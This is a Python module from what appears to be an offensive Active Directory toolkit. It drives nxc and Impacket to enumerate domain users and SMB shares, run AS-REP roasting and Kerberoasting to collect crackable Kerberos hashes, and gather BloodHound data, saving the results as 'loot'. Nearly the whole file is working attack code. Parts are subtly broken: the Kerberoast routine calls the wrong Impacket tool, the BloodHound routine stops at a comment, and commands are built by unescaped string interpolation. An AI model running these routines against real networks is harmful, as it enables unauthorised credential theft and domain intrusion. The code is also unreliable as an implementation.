# modules/auth_enum.py

import os
import shutil
from core.helpers import run_command, save_loot
from core.colors import blue, green, yellow, red

def enum_users(session, save=False):
    print(blue("[*] Extracting domain users via SMB (nxc)..."))

    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH. Please install it."))
        return

    raw_output = f"raw_users_{session.target_ip}.txt"
    parsed_output = "valid_users.txt"

    cmd = f"nxc smb {session.target_ip} -u \"{session.username}\""
    if session.hash:
        cmd += f" -p :{session.hash}"
    elif session.password:
        cmd += f" -p '{session.password}'"
    else:
        cmd += " -k --no-pass"
    cmd += " --users"

    out, err = run_command(cmd)

    if save:
        save_loot(raw_output, out or err)

    users = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 5 and parts[0].lower().startswith("smb"):
            users.append(parts[4])

    unique_users = sorted(set(users))
    if unique_users:
        for u in unique_users:
            print(green(f"[+] User: {u}"))
        if save:
            with open(f"loot/{parsed_output}", "w") as f:
                f.writelines([u + "\n" for u in unique_users])
            print(yellow(f"[+] Saved to: loot/{parsed_output}"))
    else:
        print(red("[-] No usernames extracted."))

def enum_shares(session, save=False):
    print(blue("[*] Enumerating SMB shares via nxc..."))

    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH."))
        return

    cmd = f"nxc smb {session.target_ip} --shares"
    if session.hash:
        cmd += f" -u {session.username} -p :{session.hash}"
    elif session.password:
        cmd += f" -u {session.username} -p '{session.password}'"
    else:
        cmd += f" -u {session.username} -k"

    out, err = run_command(cmd)
    print(out.strip() or err.strip())

    if save:
        save_loot(f"smb_shares_{session.target_ip}.txt", out or err)

def enum_asrep(session, save=False):
    print(blue("[*] Running AS-REP Roasting..."))

    if not shutil.which("impacket-GetNPUsers"):
        print(red("[-] impacket-GetNPUsers not found in PATH. Install Impacket."))
        return

    userfile = "loot/valid_users.txt"
    if not os.path.exists(userfile):
        print(red("[-] valid_users.txt not found. Run `attack authenum users save` first."))
        return

    cmd = f"impacket-GetNPUsers {session.domain}/ -dc-ip {session.dc_ip} -usersfile {userfile} -format hashcat"
    out, err = run_command(cmd)

    if "$krb5asrep$" in out:
        print(green("[+] AS-REP hashes found!"))
        print(out.strip())
        if save:
            save_loot("asrep_hashes.txt", out)
    else:
        print(yellow("[*] No AS-REP roastable users found."))
        print(err.strip())

def enum_kerberoast(session, save=False):
    print(blue("[*] Running Kerberoasting..."))

    if not shutil.which("impacket-GetNPUsers"):
        print(red("[-] impacket-GetNPUsers not found in PATH. Install Impacket."))
        return

    if session.hash:
        print(red("[-] Kerberoasting requires a password, not a hash."))
        return

    cmd = f"impacket-GetNPUsers -request -dc-ip {session.dc_ip} {session.domain}/{session.username}:'{session.password}'"
    out, err = run_command(cmd)

    if "$krb5tgs$" in out:
        print(green("[+] Kerberoastable accounts found!"))
        print(out.strip())
        if save:
            save_loot("kerberoast_hashes.txt", out)
    else:
        print(yellow("[*] No Kerberoastable users found."))
        print(err.strip())

def enum_bloodhound(session, save=False):
    print(blue("[*] Running BloodHound LDAP collection via nxc..."))

    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH."))
        return

    cmd = f"nxc ldap {session.dc_ip} -u \"{session.username}\""
    if session.hash:
        cmd += f" -p :{session.hash}"
    elif session.password:
        cmd += f" -p '{session.password}'"
    else:
        cmd += " -k"

    cmd += f" --dns-server {session.dc_ip} --bloodhound --collection All"

    out, err = run_command(cmd)
    combined = out + "\n" + err
    print(combined.strip())
    # Try to detect the resulting .zip file

